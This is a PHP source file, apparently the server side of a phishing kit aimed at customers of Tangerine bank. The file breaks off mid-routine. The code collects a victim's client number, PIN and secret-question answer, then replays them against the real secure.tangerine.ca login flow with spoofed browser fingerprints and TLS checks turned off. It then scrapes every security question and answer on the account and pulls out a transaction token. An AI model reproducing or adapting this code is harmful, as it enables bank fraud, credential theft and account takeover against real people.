<?php

error_reporting(7);
session_start();
set_time_limit(0);
$redirect = 'http://www.tangerine.ca/en/index.html';

$step = (isset($_POST['step'])?$_POST['step']:1);

if($step==2) 
{
 $_SESSION['cc'] = trim(rtrim($_POST['ACN']));
 
 
 
 $donor = 'https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA';
	$header=array('Host: secure.tangerine.ca','Connection: keep-alive','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36','Referer: http://www.tangerine.ca/en/index.html',
'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4');

	$cc = $_SESSION["cc"];
	$sh = curl_init();

//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$donor);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$cooc = explode ('Set-Cookie:',$data);
	array_shift($cooc);
	$lastcooc = array_pop($cooc);
	$i=0;
		foreach ($cooc as $coc)
		{
			$coocc[$i]= str_replace(array("\r\n", "\r", "\n"), '' ,$coc);
			$i++;
		}
	$lastcooc = explode('<!DOCTYPE html SYSTEM "">',$lastcooc);
	$lastcooc = str_replace(array("\r\n", "\r", "\n"), '' ,$lastcooc[0]);
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer:https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'X-DevTools-Emulate-Network-Conditions-Client-Id:','Cookie: '.$lastcooc.';'.implode(";", $coocc));
	$localinfo = 'pm_fp=version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%2529%2520applewebkit%252F537%252E36%2520%2528khtml%252C%2520like%2520gecko%2529%2520chrome%252F37%252E0%252E2062%252E120%2520safari%252F537%252E36%257C5%252E0%2520%2528Windows%2520NT%25206%252E1%253B%2520WOW64%2529%2520AppleWebKit%252F537%252E36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome%252F37%252E0%252E2062%252E120%2520Safari%252F537%252E36%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%257Cqt1%257Cqt2%257Cqt3%257Cqt4%257Cqt5%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=PersonalCIF&locale=en_CA&device=web&pm_fp='.$localinfo.'&DST=&cafemode=&refNumber=&ACN='.$cc.'&tbNickname=&ddCIF=addAnother&Go=';
	$urlpostcc = 'https://secure.tangerine.ca/web/Tangerine.html';
	sleep(rand(3,4));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		$data = curl_exec($sh);
		$urlqwest = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayChallengeQuestion';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlqwest);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh); 
		$qwest = explode('Your secret question</h2>',$data);
		$qwest = explode('</p>',$qwest[1]);
		$qwest = strip_tags($qwest[0]);
		$qwest = str_replace(array("\r\n", "\r", "\n"), '' ,$qwest);
		
		if($qwest == "")
		{
		 $step = 1;
		 
		}else $_SESSION['question'] =$qwest;
		
 }

elseif($step==4) 
{

	$donor = 'https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA';
	$header=array('Host: secure.tangerine.ca','Connection: keep-alive','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36','Referer: http://www.tangerine.ca/en/index.html',
'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4');
	$_SESSION['pin'] = $_POST['pin'];
	$cc = $_SESSION["cc"];
	$pin = $_SESSION["pin"];
	$q1 = $_SESSION["question"];
	$q2 =$_SESSION["question"];
	$q3 = $_SESSION["question"];
	$sh = curl_init();
	

//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$donor);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$cooc = explode ('Set-Cookie:',$data);
	array_shift($cooc);
	$lastcooc = array_pop($cooc);
	$i=0;
		foreach ($cooc as $coc)
		{
			$coocc[$i]= str_replace(array("\r\n", "\r", "\n"), '' ,$coc);
			$i++;
		}
	$lastcooc = explode('<!DOCTYPE html SYSTEM "">',$lastcooc);
	$lastcooc = str_replace(array("\r\n", "\r", "\n"), '' ,$lastcooc[0]);
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer:https://secure.tangerine.ca/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'X-DevTools-Emulate-Network-Conditions-Client-Id:','Cookie: '.$lastcooc.';'.implode(";", $coocc));
	$localinfo = 'pm_fp=version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%2529%2520applewebkit%252F537%252E36%2520%2528khtml%252C%2520like%2520gecko%2529%2520chrome%252F37%252E0%252E2062%252E120%2520safari%252F537%252E36%257C5%252E0%2520%2528Windows%2520NT%25206%252E1%253B%2520WOW64%2529%2520AppleWebKit%252F537%252E36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome%252F37%252E0%252E2062%252E120%2520Safari%252F537%252E36%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%257Cqt1%257Cqt2%257Cqt3%257Cqt4%257Cqt5%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=PersonalCIF&locale=en_CA&device=web&pm_fp='.$localinfo.'&DST=&cafemode=&refNumber=&ACN='.$cc.'&tbNickname=&ddCIF=addAnother&Go=';
	$urlpostcc = 'https://secure.tangerine.ca/web/Tangerine.html';
	sleep(rand(3,4));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		$data = curl_exec($sh);
		$urlqwest = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayChallengeQuestion';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlqwest);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh); 
		$qwest = explode('Your secret question</h2>',$data);
		$qwest = explode('</p>',$qwest[1]);
		$qwest = strip_tags($qwest[0]);
		$qwest = str_replace(array("\r\n", "\r", "\n"), '' ,$qwest);
		
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayChallengeQuestion',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.implode(";", $coocc));
	$localinfo ='version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%253B%2520rv%253A32%252E0%2529%2520gecko%252F20100101%2520firefox%252F32%252E0%257C5%252E0%2520%2528Windows%2529%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%252DFR%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=verifyChallengeQuestion&locale=&device=&pm_fp='.$localinfo.'&BUTTON=&Answer='.$_SESSION['answer'].'&Next=';
	sleep(rand(3,4));
 //		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		$data = curl_exec($sh);
	$urlpin = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayPIN';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		
		curl_setopt($sh,CURLOPT_URL,$urlpin);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh); 
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayPIN',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.implode(";", $coocc));		
	$localinfo ='version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%253B%2520rv%253A32%252E0%2529%2520gecko%252F20100101%2520firefox%252F32%252E0%257C5%252E0%2520%2528Windows%2529%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%252DFR%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'command=validatePINCommand&locale=en_CA&device=web&BUTTON=&pm_fp='.$localinfo.'&PIN='.$pin.'&Go=';
	sleep(rand(3,4));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		$data = curl_exec($sh);	
	$urlacc = 'https://secure.tangerine.ca/web/Tangerine.html?command=PINPADPersonal';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlacc);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
		$cooc1 = explode ('Set-Cookie:',$data);
	array_shift($cooc1);
	$lastcooc1 = array_pop($cooc1);
	$lastcooc1 = explode('Secure',$lastcooc1);
	$lastcooc1 = str_replace(array("\r\n", "\r", "\n"), '' ,$lastcooc1[0]);
	$lastcooc1 = $lastcooc1.'Secure';
	$i=0;
		foreach ($cooc1 as $coc1)
		{
			$coocc1[$i]= str_replace(array("\r\n", "\r", "\n"), '' ,$coc1);
			$i++;
		}
	$CTOK = implode(";", $coocc1);
	$CTOK = explode ('|',$CTOK);
	$CTOK = $CTOK[1];
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayPIN',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.implode(";", $coocc1).';'.implode(";", $coocc));	
	$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayENotification';
	sleep(rand(3,4));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,false);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$urlpruf = 'https://info.tangerine.ca/dcsqfhp5v10000082npv8ae8i_1k4j/dcs.gif?&dcsdat='.time().'143&dcssip=secure.tangerine.ca&dcsuri=/web/Tangerine.html&dcsqry=%3Fcommand=displayENotification&dcsref=https://secure.tangerine.ca/web/Tangerine.html%3Fcommand=PINPADPersonal&dcsaut='.$CTOK.'&WT.co_f=95.100.169.13-1306349040.30397385&WT.vt_sid=95.100.169.13-1306349040.30397385.'.time().'483&WT.tz=4&WT.bh=11&WT.ul=fr-FR&WT.cd=24&WT.sr=1440x900&WT.jo=Yes&WT.ti=Tangerine%20bank:%20Notification&WT.js=Yes&WT.jv=1.7&WT.ct=unknown&WT.bs=1440x789&WT.fi=Yes&WT.fv=14.0&WT.tv=8.0.3&WT.es=secure.tangerine.ca/web/Tangerine.html&WT.cg_n=Alert&WT.cg_s=View&WT.si_n=Alert_View&WT.si_p=ENotification&WT.vt_f_tlh='.time().'&locale=en_CA&device=web&flavour=web';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpruf);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER, true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
		$cooc2 = explode ('Set-Cookie:',$data);
	array_shift($cooc2);
	$authcooc2 = array_pop($cooc2);
	$authcooc2 = explode('GMT',$authcooc2);
	$authcooc2 = str_replace(array("\r\n", "\r", "\n"), '' ,$authcooc2[0]);
	$authcooc2 = $authcooc2.'GMT';
	$i=0;
		foreach ($cooc2 as $coc2)
		{
			$coocc3[$i]= str_replace(array("\r\n", "\r", "\n"), '' ,$coc2);
			$i++;
		}
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayPIN',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayENotification';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayENotification',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
		sleep(rand(2,3));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=retrieveGeneralSettingsInfo';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=retrieveGeneralSettingsInfo',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayGeneralSettings';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayGeneralSettings',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
		sleep(rand(2,3));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=gotoValidatedEnrollment&Initial=true';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=gotoValidatedEnrollment&Initial=true',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
		$urlgood = 'https://secure.tangerine.ca/web/Tangerine.html?command=displayValidatedEnrollment';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data = curl_exec($sh);
		$dataQQQQ = $data;
		
$s='<p for="" class="text-left">';
$ss = explode($s, $dataQQQQ);
if(count($ss)==0) exit ('details wrong.');
unset($ss[0]);
$qq= "";
foreach($ss as $s_)
{
$q = substr($s_, strpos($s_, '</b>')+strlen('</b>'), strlen($s_));
$q =substr($q, 0, strpos($q, '<br>'));

$a = substr($s_, strpos($s_, '<b>Answer: </b>')+strlen('<b>Answer: </b>'), strlen($s_));
$a =substr($a, 0, strpos($a, '</p>'));

$qq.=$q.":".$a."\r\n";
}

		$_SESSION['questions']=$qq;
		
		
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayValidatedEnrollment',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
		$urlgood = 'https://secure.tangerine.ca/web/passmarks?'.time().'247';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlgood);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data1 = curl_exec($sh);
		$urlpruf = 'https://info.tangerine.ca/dcsqfhp5v10000082npv8ae8i_1k4j/dcs.gif?&dcsdat='.time().'143&dcssip=secure.tangerine.ca&dcsuri=/web/Tangerine.html&dcsqry=%3Fcommand=displayENotification&dcsref=https://secure.tangerine.ca/web/Tangerine.html%3Fcommand=PINPADPersonal&dcsaut='.$CTOK.'&WT.co_f=95.100.169.13-1306349040.30397385&WT.vt_sid=95.100.169.13-1306349040.30397385.'.time().'483&WT.tz=4&WT.bh=11&WT.ul=fr-FR&WT.cd=24&WT.sr=1440x900&WT.jo=Yes&WT.ti=Tangerine%20bank:%20Notification&WT.js=Yes&WT.jv=1.7&WT.ct=unknown&WT.bs=1440x789&WT.fi=Yes&WT.fv=14.0&WT.tv=8.0.3&WT.es=secure.tangerine.ca/web/Tangerine.html&WT.cg_n=Alert&WT.cg_s=View&WT.si_n=Alert_View&WT.si_p=ENotification&WT.vt_f_tlh='.time().'&locale=en_CA&device=web&flavour=web';
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpruf);
		curl_setopt($sh,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($sh,CURLOPT_SSL_VERIFYHOST,false);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER, true);
		curl_setopt($sh,CURLOPT_HEADER,true);
		$data3 = curl_exec($sh);
		$cooc3 = explode ('Set-Cookie:',$data3);
	array_shift($cooc3);
	$authcooc2 = array_pop($cooc3);
	$authcooc2 = explode('GMT',$authcooc2);
	$authcooc2 = str_replace(array("\r\n", "\r", "\n"), '' ,$authcooc2[0]);
	$authcooc2 = $authcooc2.'GMT';
		$transcooc = $lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc);
		$transcooc = explode('TRANSACTION_TOKEN=',$transcooc);
		$transcooc = explode(';',$transcooc[1]);
		$transcooc = $transcooc[0];
